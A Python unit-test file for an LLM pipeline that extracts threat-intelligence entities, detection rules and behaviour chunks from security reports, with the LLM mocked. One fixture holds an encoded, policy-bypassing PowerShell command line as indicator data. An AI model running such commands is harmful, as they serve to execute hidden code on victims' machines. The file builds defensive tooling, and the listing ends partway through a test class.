"""Unit tests for the LLM nodes.

These tests MOCK the call_llm function so no API calls are made.
They test the node logic: prompt construction, response processing,
post-processing (dedup, validation, ID assignment), and error handling.
"""

import asyncio

import pytest
from unittest.mock import patch, MagicMock, AsyncMock
from dataclasses import dataclass

from app.graph.state import (
    EntityType,
    DetectionRuleType,
    PipelineStatus,
    SectionClassification,
)
from app.nodes.llm.llm_adapter import LLMResponse

# Import node functions
from app.nodes.llm.entity_extraction import (
    extract_entities,
    _process_entities,
    _process_detection_rules,
    _build_metadata_context,
)
from pydantic import ValidationError

from app.nodes.llm.tool_models import ChunkBehaviorsOutput, ChunkItem
from app.nodes.llm.chunking import (
    CHUNK_BEHAVIORS_TOOL,
    chunk_behaviors,
    _classify_sections,
    _number_lines,
    _resolve_section_ranges,
    _GAP_FILL_CONFIDENCE,
    _extract_behavioral_text,
    _build_entity_context,
    _classify_source_provenance,
    _finalize_chunks,
    _build_rerun_feedback_context,
)
from app.nodes.llm.technique_extraction import (
    extract_techniques,
    _build_technique_rerun_context,
    _process_technique_mappings,
    TECHNIQUE_ID_RE,
)
from app.nodes.llm.drafting import (
    draft_procedures,
    _process_drafts,
)
from app.nodes.llm.figure_extraction import (
    extract_figures,
    _format_figure_block,
    _replace_placeholders_in_order,
)
from app.nodes.llm.feedback_synthesis import (
    synthesize_feedback,
    captured_corrections,
    _had_real_reviews,
    _compute_deltas,
    _deltas_have_signal,
    _delta_anchors,
    _entity_deltas,
    _chunk_deltas,
    _procedure_deltas,
    _relationship_deltas,
    _format_deltas_for_synthesis,
)
from app.nodes.llm.tool_models import ExtractFigureOutput


# ── Shared mock helper ────────────────────────────────────────────


def _mock_llm_response(tool_output: dict) -> LLMResponse:
    """Create a mock LLMResponse with given tool_output."""
    return LLMResponse(
        tool_output=tool_output,
        raw_text="",
        model="claude-sonnet-4-20250514",
        input_tokens=100,
        output_tokens=200,
        stop_reason="tool_use",
    )


# =============================================================================
# extract_entities
# =============================================================================


class TestExtractEntities:
    """Tests for the extract_entities node."""

    @pytest.fixture(autouse=True)
    def _mock_feedback_fetch(self):
        """Auto-mock the postgres feedback fetch so tests don't need a DB.

        Returns empty string → entity_extraction's prompt is unchanged
        from pre-flywheel behavior, so all assertions on prompt content
        still pass."""
        with patch(
            "app.nodes.llm.entity_extraction._fetch_feedback_addendum",
            new_callable=AsyncMock,
            return_value="",
        ) as m, patch(
            # The corrected-example channel is a SECOND fetch. Unpatched it
            # opens a real DB connection per test and degrades to "" — passing
            # tests, but reaching postgres from a unit suite.
            "app.nodes.llm.entity_extraction._fetch_feedback_examples",
            new_callable=AsyncMock,
            return_value="",
        ):
            yield m

    @pytest.mark.asyncio
    @patch("app.nodes.llm.entity_extraction.load_denylist", new_callable=AsyncMock)
    async def test_apply_entity_denylist_tags_matches(self, mock_load):
        """Denylisted entity values get tagged (case-insensitive); others untouched."""
        from app.nodes.llm.entity_extraction import _apply_entity_denylist
        mock_load.return_value = {
            "values": {"info@cert.example": {"pattern_id": "p1", "pattern": "emails are defender contacts"}},
            "technique_ids": {},
        }
        entities = [
            {"value": "INFO@cert.example", "entity_type": "ioc_email"},
            {"value": "Cobalt Strike", "entity_type": "malware"},
        ]
        tagged = await _apply_entity_denylist(entities)
        assert tagged == 1
        assert entities[0]["denylisted"] is True
        assert entities[0]["denylist_pattern_id"] == "p1"
        assert "denylisted" not in entities[1]

    @pytest.mark.asyncio
    @patch("app.nodes.llm.entity_extraction.load_denylist", new_callable=AsyncMock)
    async def test_apply_entity_denylist_noop_when_empty(self, mock_load):
        """No denylist values -> nothing tagged."""
        from app.nodes.llm.entity_extraction import _apply_entity_denylist
        mock_load.return_value = {"values": {}, "technique_ids": {}}
        entities = [{"value": "x", "entity_type": "malware"}]
        tagged = await _apply_entity_denylist(entities)
        assert tagged == 0
        assert "denylisted" not in entities[0]

    @pytest.mark.asyncio
    @patch("app.nodes.llm.entity_extraction.call_llm", new_callable=AsyncMock)
    async def test_extracts_entities_and_rules(self, mock_call):
        """Node returns entities and detection rules from LLM output."""
        mock_call.return_value = _mock_llm_response({
            "entities": [
                {"value": "APT29", "entity_type": "intrusion_set", "confidence": 0.95},
                {"value": "Cobalt Strike", "entity_type": "malware", "confidence": 0.9},
                {"value": "203.0.113.10", "entity_type": "ioc_ip", "confidence": 1.0},
            ],
            "detection_rules": [
                {
                    "rule_type": "sigma",
                    "rule_content": "title: Certutil Download\nlogsource: ...",
                    "description": "Detects certutil abuse",
                },
            ],
        })

        state = {
            "parsed_text": "APT29 used Cobalt Strike...",
            "metadata": {"author": "Test"},
        }
        result = await extract_entities(state)

        assert result["status"] == PipelineStatus.EXTRACTING_ENTITIES.value
        assert len(result["entities"]) == 3
        assert len(result["detection_rules"]) == 1
        assert result["entities"][0]["value"] == "APT29"
        assert result["entities"][0]["entity_id"].startswith("ent-")
        assert "error" not in result

    @pytest.mark.asyncio
    @patch("app.nodes.llm.entity_extraction.call_llm", new_callable=AsyncMock)
    async def test_adapter_dropped_items_are_logged_not_fatal(self, mock_call, caplog):
        """When the adapter salvaged the response by dropping a malformed
        item, the node keeps the survivors and says how many were dropped
        next to its own count. One bad row of 181 once cost the whole list."""
        response = _mock_llm_response({
            "entities": [
                {"value": "APT29", "entity_type": "intrusion_set", "confidence": 0.95},
                {"value": "203.0.113.10", "entity_type": "ioc_ip", "confidence": 1.0},
            ],
            "detection_rules": [],
        })
        response.dropped_items = [
            {"field": "entities", "index": 179, "error_types": ["extra_forbidden", "missing"]},
        ]
        mock_call.return_value = response

        state = {"parsed_text": "APT29 used ...", "metadata": {}}
        with caplog.at_level("WARNING", logger="app.nodes.llm.entity_extraction"):
            result = await extract_entities(state)

        assert result["status"] == PipelineStatus.EXTRACTING_ENTITIES.value
        assert [e["value"] for e in result["entities"]] == ["APT29", "203.0.113.10"]
        assert "error" not in result
        assert any(
            "dropped 1 malformed item(s) from ['entities']" in r.getMessage()
            for r in caplog.records
        )

    @pytest.mark.asyncio
    @patch("app.nodes.llm.entity_extraction.call_llm", new_callable=AsyncMock)
    async def test_empty_text_fails(self, mock_call):
        """Empty parsed_text returns FAILED."""
        state = {"parsed_text": "", "metadata": {}}
        result = await extract_entities(state)

        assert result["status"] == PipelineStatus.FAILED.value
        assert result["entities"] == []
        mock_call.assert_not_called()

    @pytest.mark.asyncio
    @patch("app.nodes.llm.entity_extraction.call_llm", new_callable=AsyncMock)
    async def test_api_error_handled(self, mock_call):
        """API error is caught and returns FAILED."""
        mock_call.side_effect = Exception("API timeout")

        state = {"parsed_text": "Some report text here...", "metadata": {}}
        result = await extract_entities(state)

        assert result["status"] == PipelineStatus.FAILED.value
        assert "API timeout" in result["error"]

    @pytest.mark.asyncio
    @patch("app.nodes.llm.entity_extraction.call_llm", new_callable=AsyncMock)
    async def test_sequentiality_yes_override_skips_llm_classification(self, mock_call):
        """sequentiality='yes' resolves to is_sequential=True regardless of
        what the LLM emits — analyst override wins."""
        mock_call.return_value = _mock_llm_response({
            "entities": [],
            "detection_rules": [],
            "is_sequential": False,  # LLM says non-sequential
            "sequentiality_rationale": "Catalog shape detected",
        })
        state = {
            "parsed_text": "Some text...",
            "metadata": {},
            "sequentiality": "yes",
        }
        result = await extract_entities(state)
        assert result["is_sequential"] is True
        assert "override" in result["sequentiality_rationale"].lower()

    @pytest.mark.asyncio
    @patch("app.nodes.llm.entity_extraction.call_llm", new_callable=AsyncMock)
    async def test_sequentiality_no_override_skips_llm_classification(self, mock_call):
        """sequentiality='no' resolves to is_sequential=False regardless of
        what the LLM emits."""
        mock_call.return_value = _mock_llm_response({
            "entities": [],
            "detection_rules": [],
            "is_sequential": True,  # LLM says sequential
            "sequentiality_rationale": "Linear narrative detected",
        })
        state = {
            "parsed_text": "Some text...",
            "metadata": {},
            "sequentiality": "no",
        }
        result = await extract_entities(state)
        assert result["is_sequential"] is False
        assert "override" in result["sequentiality_rationale"].lower()

    @pytest.mark.asyncio
    @patch("app.nodes.llm.entity_extraction.call_llm", new_callable=AsyncMock)
    async def test_sequentiality_auto_uses_llm_output(self, mock_call):
        """sequentiality='auto' (default) trusts the LLM's classification."""
        mock_call.return_value = _mock_llm_response({
            "entities": [],
            "detection_rules": [],
            "is_sequential": False,
            "sequentiality_rationale": "Catalog shape — bulleted TTP list.",
        })
        state = {
            "parsed_text": "Some text...",
            "metadata": {},
            "sequentiality": "auto",
        }
        result = await extract_entities(state)
        assert result["is_sequential"] is False
        assert "Catalog" in result["sequentiality_rationale"]

    @pytest.mark.asyncio
    @patch("app.nodes.llm.entity_extraction.call_llm", new_callable=AsyncMock)
    async def test_sequentiality_default_is_auto_when_field_missing(self, mock_call):
        """Missing sequentiality field on state defaults to auto path —
        preserves behavior for in-flight checkpoints predating the field."""
        mock_call.return_value = _mock_llm_response({
            "entities": [],
            "detection_rules": [],
            "is_sequential": True,
            "sequentiality_rationale": "Linear narrative.",
        })
        state = {"parsed_text": "Some text...", "metadata": {}}
        result = await extract_entities(state)
        assert result["is_sequential"] is True
        assert "Linear" in result["sequentiality_rationale"]

    @pytest.mark.asyncio
    @patch("app.nodes.llm.entity_extraction.call_llm", new_callable=AsyncMock)
    async def test_metadata_context_injected(self, mock_call):
        """Metadata is injected into the system prompt."""
        mock_call.return_value = _mock_llm_response({"entities": [], "detection_rules": []})

        state = {
            "parsed_text": "Some text...",
            "metadata": {
                "author": "Rapid7",
                "threat_actor": "APT29",
                "campaign": "SolarWinds",
            },
        }
        await extract_entities(state)

        # Check system prompt includes metadata
        call_args = mock_call.call_args
        system = call_args.kwargs["system"]
        assert "Rapid7" in system
        assert "APT29" in system
        assert "SolarWinds" in system


class TestProcessEntities:
    """Tests for entity post-processing."""

    def test_deduplicates(self):
        """Duplicate (value, type) pairs are deduplicated."""
        raw = [
            {"value": "APT29", "entity_type": "intrusion_set", "confidence": 0.9},
            {"value": "apt29", "entity_type": "intrusion_set", "confidence": 0.8},
        ]
        result = _process_entities(raw)
        assert len(result) == 1

    def test_invalid_type_skipped(self):
        """Entities with invalid types are skipped."""
        raw = [
            {"value": "test", "entity_type": "fake_type", "confidence": 0.5},
        ]
        result = _process_entities(raw)
        assert len(result) == 0

    def test_empty_value_skipped(self):
        """Entities with empty values are skipped."""
        raw = [
            {"value": "", "entity_type": "malware", "confidence": 0.9},
            {"value": "  ", "entity_type": "malware", "confidence": 0.9},
        ]
        result = _process_entities(raw)
        assert len(result) == 0

    def test_confidence_clamped(self):
        """Confidence is clamped to 0.0-1.0."""
        raw = [
            {"value": "APT29", "entity_type": "intrusion_set", "confidence": 1.5},
            {"value": "test.exe", "entity_type": "ioc_file_path", "confidence": -0.3},
        ]
        result = _process_entities(raw)
        assert result[0]["confidence"] == 1.0
        assert result[1]["confidence"] == 0.0

    def test_gate_fields_initialized(self):
        """Gate action fields start as None."""
        raw = [{"value": "APT29", "entity_type": "intrusion_set", "confidence": 0.9}]
        result = _process_entities(raw)
        assert result[0]["gate_action"] is None
        assert result[0]["edited_value"] is None

    def test_command_line_and_process_name_accepted(self):
        """The two new SCO types added for procedure-bound observables flow
        through unchanged. Regression for the entity-vs-procedure split: both
        types should land in the entity table so Gate 0 can review them."""
        raw = [
            {
                "value": "powershell.exe -ExecutionPolicy Bypass -enc SQBFAFgA",
                "entity_type": "ioc_command_line",
                "confidence": 1.0,
            },
            {
                "value": "powershell.exe",
                "entity_type": "ioc_process_name",
                "confidence": 1.0,
            },
        ]
        result = _process_entities(raw)
        types = {r["entity_type"] for r in result}
        assert types == {"ioc_command_line", "ioc_process_name"}

    def test_tool_and_process_name_coexist_when_same_value(self):
        """The dedup key is (value_lower, entity_type). The same string emitted
        as both a `tool` and an `ioc_process_name` survives as two records —
        this is the documented behavior for capturing both the abstract LOLBin
        label and the concrete on-disk binary."""
        raw = [
            {"value": "certutil", "entity_type": "tool", "confidence": 0.9},
            {"value": "certutil", "entity_type": "ioc_process_name", "confidence": 0.9},
        ]
        result = _process_entities(raw)
        assert len(result) == 2
        assert {r["entity_type"] for r in result} == {"tool", "ioc_process_name"}


class TestProcessDetectionRules:
    """Tests for detection rule post-processing."""

    def test_valid_rule_processed(self):
        raw = [{
            "rule_type": "sigma",
            "rule_content": "title: Test\nlogsource: windows",
            "description": "Test rule",
        }]
        result = _process_detection_rules(raw)
        assert len(result) == 1
        assert result[0]["rule_id"].startswith("rule-")
        assert result[0]["rule_type"] == "sigma"

    def test_empty_content_skipped(self):
        raw = [{"rule_type": "sigma", "rule_content": "", "description": ""}]
        result = _process_detection_rules(raw)
        assert len(result) == 0

    def test_invalid_type_skipped(self):
        raw = [{"rule_type": "fake_rule_type", "rule_content": "some content"}]
        result = _process_detection_rules(raw)
        assert len(result) == 0


class TestBuildMetadataContext:
    """Tests for metadata context builder."""

    def test_full_metadata(self):
        ctx = _build_metadata_context({
            "author": "Test Corp",
            "threat_actor": "APT29",
            "campaign": "Op1",
            "malware_family": "Cobalt Strike",
        })
        assert "Test Corp" in ctx
        assert "APT29" in ctx

    def test_empty_metadata(self):
        assert _build_metadata_context({}) == ""


# =============================================================================
# chunk_behaviors
# =============================================================================


class TestChunkBehaviors:
    """Tests for the chunk_behaviors node."""

    @pytest.fixture(autouse=True)
    def _mock_feedback_fetch(self):
        """Auto-mock the postgres feedback fetch so tests don't need a DB."""
        with patch(
            "app.nodes.llm.chunking._fetch_feedback_addendum",
            new_callable=AsyncMock,
            return_value="",
        ) as m, patch(
            # The corrected-example channel is a SECOND fetch. Unpatched it
            # opens a real DB connection per test and degrades to "" — passing
            # tests, but reaching postgres from a unit suite.
            "app.nodes.llm.chunking._fetch_feedback_examples",
            new_callable=AsyncMock,
            return_value="",
        ):
            yield m

    @pytest.mark.asyncio
    @patch("app.nodes.llm.chunking.call_llm", new_callable=AsyncMock)
    async def test_classifies_and_chunks(self, mock_call):
        """Node classifies sections then chunks behavioral ones."""
        # First call: classify_sections
        classify_response = _mock_llm_response({
            "sections": [
                {
                    "start_line": 1, "end_line": 1,
                    "classification": "behavioral_narrative",
                    "classification_confidence": 0.95,
                },
                {
                    "start_line": 2, "end_line": 2,
                    "classification": "metadata",
                    "classification_confidence": 0.9,
                },
            ],
        })

        # Second call: chunk_behaviors
        chunk_response = _mock_llm_response({
            "chunks": [
                {
                    "text": "APT29 exploited CVE-2023-46604 on the ActiveMQ server to gain initial access.",
                    "context": {"actor": "APT29"},
                    "sequence_index": 1,
                    "predecessor_indices": [],
                    "behavioral_confidence": 0.9,
                },
            ],
        })

        mock_call.side_effect = [classify_response, chunk_response]

        state = {
            "parsed_text": "APT29 exploited CVE-2023-46604...\nPublished by Rapid7...",
            "validated_entities": [],
            "metadata": {},
        }
        result = await chunk_behaviors(state)

        assert result["status"] == PipelineStatus.CHUNKING.value
        assert len(result["classified_sections"]) == 2
        assert len(result["chunks"]) == 1
        assert result["chunks"][0]["chunk_id"].startswith("chk-")

    @pytest.mark.asyncio
    @patch("app.nodes.llm.chunking.call_llm", new_callable=AsyncMock)
    async def test_empty_text_fails(self, mock_call):
        state = {"parsed_text": "", "validated_entities": [], "metadata": {}}
        result = await chunk_behaviors(state)
        assert result["status"] == PipelineStatus.FAILED.value
        mock_call.assert_not_called()

    @pytest.mark.asyncio
    @patch("app.nodes.llm.chunking.call_llm", new_callable=AsyncMock)
    async def test_no_behavioral_sections(self, mock_call):
        """If no behavioral sections found, fail loudly.

        Prior behavior: returned chunks=[] with no error → pipeline silently
        advanced to gate_chunks with an empty canvas. Now sets status=FAILED
        with a descriptive error so the analyst can see what happened.
        """
        mock_call.return_value = _mock_llm_response({
            "sections": [
                {
                    "start_line": 1, "end_line": 1,
                    "classification": "metadata",
                    "classification_confidence": 0.9,
                },
            ],
        })
        state = {"parsed_text": "Author info...", "validated_entities": [], "metadata": {}}
        result = await chunk_behaviors(state)

        assert result["chunks"] == []
        assert len(result["classified_sections"]) == 1
        assert result["status"] == PipelineStatus.FAILED.value
        assert "No behavioral sections" in result["error"]
        assert "metadata" in result["error"]  # surfaces the classifier output


class TestNumberLines:
    """_number_lines builds the addressable view the classifier sees."""

    def test_numbering_is_one_based_and_covers_blank_lines(self):
        assert _number_lines("a\n\nb") == "1|a\n2|\n3|b"

    def test_line_n_maps_back_to_split_index(self):
        text = "alpha\nbravo\ncharlie"
        numbered = _number_lines(text).split("\n")
        for i, line in enumerate(text.split("\n"), start=1):
            assert numbered[i - 1] == f"{i}|{line}"


class TestResolveSectionRanges:
    """_resolve_section_ranges repairs the classifier's line ranges.

    Every repair exists to guarantee one property: the returned ranges are a
    gap-free, non-overlapping partition of lines 1..total_lines, so no source
    text is lost or double-counted no matter what the model emitted.
    """

    @staticmethod
    def _sec(start, end, cls="contextual", conf=0.9):
        return {
            "start_line": start, "end_line": end,
            "classification": cls, "classification_confidence": conf,
        }

    def _assert_partitions(self, resolved, total_lines):
        """Ranges tile 1..total_lines exactly once, in order."""
        cursor = 1
        for start, end, _cls, _conf in resolved:
            assert start == cursor, f"gap or overlap at line {cursor}"
            assert end >= start
            cursor = end + 1
        assert cursor == total_lines + 1

    def test_clean_contiguous_ranges_pass_through(self):
        raw = [self._sec(1, 3, "behavioral_narrative"), self._sec(4, 6, "metadata")]
        resolved = _resolve_section_ranges(raw, 6)
        assert resolved == [
            (1, 3, "behavioral_narrative", 0.9),
            (4, 6, "metadata", 0.9),
        ]

    def test_out_of_order_ranges_are_sorted(self):
        raw = [self._sec(4, 6, "metadata"), self._sec(1, 3, "behavioral_narrative")]
        resolved = _resolve_section_ranges(raw, 6)
        assert [r[2] for r in resolved] == ["behavioral_narrative", "metadata"]
        self._assert_partitions(resolved, 6)

    def test_end_line_past_document_is_clamped(self):
        resolved = _resolve_section_ranges([self._sec(1, 100_000)], 5)
        assert resolved == [(1, 5, "contextual", 0.9)]

    def test_inverted_range_is_swapped(self):
        resolved = _resolve_section_ranges([self._sec(5, 1)], 5)
        assert resolved == [(1, 5, "contextual", 0.9)]

    def test_overlap_truncates_later_section(self):
        # 1-5 and 4-8 overlap on 4-5; the earlier section keeps them.
        raw = [self._sec(1, 5, "behavioral_narrative"), self._sec(4, 8, "metadata")]
        resolved = _resolve_section_ranges(raw, 8)
        assert resolved == [
            (1, 5, "behavioral_narrative", 0.9),
            (6, 8, "metadata", 0.9),
        ]
        self._assert_partitions(resolved, 8)

    def test_fully_swallowed_section_is_dropped(self):
        raw = [self._sec(1, 10, "behavioral_narrative"), self._sec(3, 5, "metadata")]
        resolved = _resolve_section_ranges(raw, 10)
        assert resolved == [(1, 10, "behavioral_narrative", 0.9)]

    def test_interior_gap_is_filled_as_behavioral(self):
        """A skipped stretch must not vanish — recall bias makes it behavioral."""
        raw = [self._sec(1, 2, "metadata"), self._sec(7, 9, "metadata")]
        resolved = _resolve_section_ranges(raw, 9)
        assert resolved == [
            (1, 2, "metadata", 0.9),
            (3, 6, "behavioral_narrative", _GAP_FILL_CONFIDENCE),
            (7, 9, "metadata", 0.9),
        ]
        self._assert_partitions(resolved, 9)

    def test_leading_and_trailing_gaps_are_filled(self):
        resolved = _resolve_section_ranges([self._sec(3, 5, "metadata")], 8)
        assert resolved == [
            (1, 2, "behavioral_narrative", _GAP_FILL_CONFIDENCE),
            (3, 5, "metadata", 0.9),
            (6, 8, "behavioral_narrative", _GAP_FILL_CONFIDENCE),
        ]
        self._assert_partitions(resolved, 8)

    def test_no_sections_yields_whole_document_as_behavioral(self):
        resolved = _resolve_section_ranges([], 4)
        assert resolved == [(1, 4, "behavioral_narrative", _GAP_FILL_CONFIDENCE)]

    def test_unknown_classification_falls_back_to_unclassified(self):
        resolved = _resolve_section_ranges([self._sec(1, 3, "not_a_real_type")], 3)
        assert resolved[0][2] == "unclassified"

    def test_non_integer_range_is_dropped_not_crashed(self):
        raw = [{"start_line": "x", "end_line": None,
                "classification": "metadata", "classification_confidence": 0.5}]
        resolved = _resolve_section_ranges(raw, 3)
        # Dropped, then the whole doc recovered as a gap fill.
        assert resolved == [(1, 3, "behavioral_narrative", _GAP_FILL_CONFIDENCE)]

    def test_confidence_is_clamped(self):
        raw = [self._sec(1, 1, conf=5.0), self._sec(2, 2, conf=-3.0)]
        resolved = _resolve_section_ranges(raw, 2)
        assert [r[3] for r in resolved] == [1.0, 0.0]


class TestClassifySectionsReconstruction:
    """_classify_sections slices section text from parsed_text, verbatim."""

    @pytest.mark.asyncio
    @patch("app.nodes.llm.chunking.call_llm", new_callable=AsyncMock)
    async def test_text_is_sliced_from_source_not_echoed(self, mock_call):
        parsed_text = "line one\nline two\nline three\nline four"
        mock_call.return_value = _mock_llm_response({
            "sections": [
                {"start_line": 1, "end_line": 2,
                 "classification": "behavioral_narrative",
                 "classification_confidence": 0.9},
                {"start_line": 3, "end_line": 4,
                 "classification": "metadata",
                 "classification_confidence": 0.8},
            ],
        })

        sections = await _classify_sections(parsed_text)

        assert [s["text"] for s in sections] == [
            "line one\nline two",
            "line three\nline four",
        ]
        # Section text must be findable verbatim in parsed_text — downstream
        # source_span lookups do parsed_text.find(excerpt).
        for s in sections:
            assert s["text"] in parsed_text
        assert sections[0]["source_location"] == {"start_line": 1, "end_line": 2}

    @pytest.mark.asyncio
    @patch("app.nodes.llm.chunking.call_llm", new_callable=AsyncMock)
    async def test_prompt_shows_numbered_lines(self, mock_call):
        mock_call.return_value = _mock_llm_response({
            "sections": [{"start_line": 1, "end_line": 2,
                          "classification": "behavioral_narrative",
                          "classification_confidence": 0.9}],
        })

        await _classify_sections("alpha\nbravo")

        content = mock_call.call_args.kwargs["messages"][0]["content"]
        assert "1|alpha" in content and "2|bravo" in content

    @pytest.mark.asyncio
    @patch("app.nodes.llm.chunking.call_llm", new_callable=AsyncMock)
    async def test_whitespace_only_range_is_skipped(self, mock_call):
        parsed_text = "real text\n\n   \nmore text"
        mock_call.return_value = _mock_llm_response({
            "sections": [
                {"start_line": 1, "end_line": 1,
                 "classification": "behavioral_narrative",
                 "classification_confidence": 0.9},
                {"start_line": 2, "end_line": 3,
                 "classification": "metadata",
                 "classification_confidence": 0.9},
                {"start_line": 4, "end_line": 4,
                 "classification": "behavioral_narrative",
                 "classification_confidence": 0.9},
            ],
        })

        sections = await _classify_sections(parsed_text)

        assert [s["text"] for s in sections] == ["real text", "more text"]

    @pytest.mark.asyncio
    @patch("app.nodes.llm.chunking.call_llm", new_callable=AsyncMock)
    async def test_empty_model_output_returns_no_sections(self, mock_call):
        mock_call.return_value = _mock_llm_response({"sections": []})
        assert await _classify_sections("some text") == []


class TestFinalizeChunks:
    """_finalize_chunks derives source_span and inverts predecessor_indices."""

    def test_source_span_from_excerpt_first_match(self):
        parsed_text = "intro. APT29 ran certutil to download a payload. tail."
        chunks = [{
            "chunk_id": "ch-1", "sequence_index": 1, "predecessor_indices": [],
            "source_excerpt": "APT29 ran certutil to download a payload.",
        }]
        out = _finalize_chunks(chunks, parsed_text)
        start, end = out[0]["source_span"]
        assert parsed_text[start:end] == "APT29 ran certutil to download a payload."

    def test_source_span_none_when_excerpt_absent(self):
        chunks = [{
            "chunk_id": "ch-1", "sequence_index": 1, "predecessor_indices": [],
            "source_excerpt": "this text never appears in source",
        }]
        out = _finalize_chunks(chunks, "completely different content")
        assert out[0]["source_span"] is None

    def test_source_span_none_when_excerpt_empty(self):
        chunks = [{
            "chunk_id": "ch-1", "sequence_index": 1, "predecessor_indices": [],
            "source_excerpt": "",
        }]
        out = _finalize_chunks(chunks, "anything")
        assert out[0]["source_span"] is None

    def test_precedes_ids_inverted_from_predecessors_linear(self):
        """Linear: ch-1 -> ch-2 -> ch-3. ch-2 has predecessor [1], ch-3 has [2]."""
        chunks = [
            {"chunk_id": "ch-1", "sequence_index": 1, "predecessor_indices": [], "source_excerpt": ""},
            {"chunk_id": "ch-2", "sequence_index": 2, "predecessor_indices": [1], "source_excerpt": ""},
            {"chunk_id": "ch-3", "sequence_index": 3, "predecessor_indices": [2], "source_excerpt": ""},
        ]
        out = _finalize_chunks(chunks, "")
        precedes = {c["chunk_id"]: c["precedes_ids"] for c in out}
        assert precedes == {"ch-1": ["ch-2"], "ch-2": ["ch-3"], "ch-3": []}

    def test_precedes_ids_branch(self):
        """Branch: ch-1 -> ch-2 and ch-1 -> ch-3."""
        chunks = [
            {"chunk_id": "ch-1", "sequence_index": 1, "predecessor_indices": [], "source_excerpt": ""},
            {"chunk_id": "ch-2", "sequence_index": 2, "predecessor_indices": [1], "source_excerpt": ""},
            {"chunk_id": "ch-3", "sequence_index": 3, "predecessor_indices": [1], "source_excerpt": ""},
        ]
        out = _finalize_chunks(chunks, "")
        ch1_precedes = next(c for c in out if c["chunk_id"] == "ch-1")["precedes_ids"]
        assert sorted(ch1_precedes) == ["ch-2", "ch-3"]

    def test_precedes_ids_convergence(self):
        """Convergence: ch-1 -> ch-3 and ch-2 -> ch-3."""
        chunks = [
            {"chunk_id": "ch-1", "sequence_index": 1, "predecessor_indices": [], "source_excerpt": ""},
            {"chunk_id": "ch-2", "sequence_index": 2, "predecessor_indices": [], "source_excerpt": ""},
            {"chunk_id": "ch-3", "sequence_index": 3, "predecessor_indices": [1, 2], "source_excerpt": ""},
        ]
        out = _finalize_chunks(chunks, "")
        precedes = {c["chunk_id"]: c["precedes_ids"] for c in out}
        assert precedes["ch-1"] == ["ch-3"]
        assert precedes["ch-2"] == ["ch-3"]
        assert precedes["ch-3"] == []

    def test_dangling_predecessor_index_silently_ignored(self):
        """Predecessor pointing at a non-existent sequence_index drops out
        (no exception, no precedes_ids entry)."""
        chunks = [
            {"chunk_id": "ch-1", "sequence_index": 1, "predecessor_indices": [99], "source_excerpt": ""},
        ]
        out = _finalize_chunks(chunks, "")
        assert out[0]["precedes_ids"] == []  # 99 doesn't map to any chunk_id

    def test_orphan_chunk_gets_backstop_link(self):
        """Truly disconnected chunk (no preds, no successors) gets linked
        to the immediately-prior chunk in emission order."""
        chunks = [
            {"chunk_id": "ch-1", "sequence_index": 1, "predecessor_indices": [], "source_excerpt": ""},
            {"chunk_id": "ch-2", "sequence_index": 2, "predecessor_indices": [1], "source_excerpt": ""},
            # ch-3 is orphaned: empty preds AND no other chunk references seq=3.
            {"chunk_id": "ch-3", "sequence_index": 3, "predecessor_indices": [], "source_excerpt": ""},
        ]
        out = _finalize_chunks(chunks, "")
        ch3 = next(c for c in out if c["chunk_id"] == "ch-3")
        assert ch3["predecessor_indices"] == [2]
        ch2_precedes = next(c for c in out if c["chunk_id"] == "ch-2")["precedes_ids"]
        assert "ch-3" in ch2_precedes

    def test_parallel_root_not_backstopped(self):
        """A chunk with empty predecessor_indices that IS referenced
        downstream stays empty (legitimate parallel root)."""
        chunks = [
            {"chunk_id": "ch-1", "sequence_index": 1, "predecessor_indices": [], "source_excerpt": ""},
            {"chunk_id": "ch-2", "sequence_index": 2, "predecessor_indices": [], "source_excerpt": ""},
            {"chunk_id": "ch-3", "sequence_index": 3, "predecessor_indices": [1, 2], "source_excerpt": ""},
        ]
        out = _finalize_chunks(chunks, "")
        ch2 = next(c for c in out if c["chunk_id"] == "ch-2")
        assert ch2["predecessor_indices"] == []  # not backstopped — ch-3 references it

    def test_reused_excerpt_anchors_to_distinct_offsets(self):
        """When the LLM reuses the same source_excerpt across chunks,
        each occurrence should anchor to a distinct offset when one exists."""
        text = "He ran the script. He ran the script. tail."
        chunks = [
            {"chunk_id": "ch-1", "sequence_index": 1, "predecessor_indices": [],
             "source_excerpt": "He ran the script."},
            {"chunk_id": "ch-2", "sequence_index": 2, "predecessor_indices": [1],
             "source_excerpt": "He ran the script."},
        ]
        out = _finalize_chunks(chunks, text)
        span1 = out[0]["source_span"]
        span2 = out[1]["source_span"]
        assert span1 is not None and span2 is not None
        assert span1[0] != span2[0]  # distinct anchor positions

    def test_non_sequential_skips_orphan_backstop(self):
        """is_sequential=False disables the orphan-link backstop so disconnected
        components survive — the expected shape for catalog/profile sources."""
        chunks = [
            {"chunk_id": "ch-1", "sequence_index": 1, "predecessor_indices": [], "source_excerpt": ""},
            {"chunk_id": "ch-2", "sequence_index": 2, "predecessor_indices": [1], "source_excerpt": ""},
            # Would be backstopped to ch-2 in sequential mode.
            {"chunk_id": "ch-3", "sequence_index": 3, "predecessor_indices": [], "source_excerpt": ""},
        ]
        out = _finalize_chunks(chunks, "", is_sequential=False)
        ch3 = next(c for c in out if c["chunk_id"] == "ch-3")
        assert ch3["predecessor_indices"] == []
        ch2 = next(c for c in out if c["chunk_id"] == "ch-2")
        assert "ch-3" not in ch2["precedes_ids"]  # no fictional forward edge

    def test_non_sequential_preserves_explicit_predecessors(self):
        """Even in non-sequential mode, edges the LLM emits explicitly are
        preserved — the source said one procedure follows another."""
        chunks = [
            {"chunk_id": "ch-1", "sequence_index": 1, "predecessor_indices": [], "source_excerpt": ""},
            {"chunk_id": "ch-2", "sequence_index": 2, "predecessor_indices": [1], "source_excerpt": ""},
            {"chunk_id": "ch-3", "sequence_index": 3, "predecessor_indices": [], "source_excerpt": ""},
        ]
        out = _finalize_chunks(chunks, "", is_sequential=False)
        ch2 = next(c for c in out if c["chunk_id"] == "ch-2")
        assert ch2["predecessor_indices"] == [1]
        ch1_precedes = next(c for c in out if c["chunk_id"] == "ch-1")["precedes_ids"]
        assert "ch-2" in ch1_precedes


class TestChunkToolSchemaMatchesValidator:
    """The chunk tool schema and its Pydantic validator must stay in sync.

    Three places have to agree on chunk fields: the tool schema (what the LLM
    is told to emit), ChunkItem (what we accept), and state.Chunk (what flows
    downstream). This project has shipped that drift twice — `source_excerpt`,
    and `precondition`, which made the LLM emit a field ChunkItem
    forbade and hard-failed a whole 40-chunk run on a live source. These tests
    make the mismatch fail in CI instead of on a real report.
    """

    @staticmethod
    def _schema_props():
        return set(
            CHUNK_BEHAVIORS_TOOL["input_schema"]["properties"]
            ["chunks"]["items"]["properties"]
        )

